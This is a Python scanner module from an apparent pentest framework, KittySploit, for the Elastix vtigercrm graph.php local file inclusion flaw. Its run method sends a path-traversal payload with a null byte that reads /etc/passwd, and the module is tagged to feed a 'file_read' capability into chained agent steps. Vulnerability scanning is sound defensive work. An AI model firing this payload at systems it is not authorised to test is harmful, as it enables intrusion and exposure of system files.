#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Elastix vtigercrm graph.php LFI."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Elastix - graph.php LFI Detection',
        'description': (
            'Detects Elastix vtigercrm/graph.php current_language LFI to /etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'elastix', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/18650',
        ],
    }

    def run(self):
        trav = '../' * 6 + 'etc/passwd%00'
        path = (
            f'/vtigercrm/graph.php?current_language={trav}'
            '&module=Accounts&action'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='Elastix graph.php LFI',
                path='/vtigercrm/graph.php',
            )
            return True
        return False
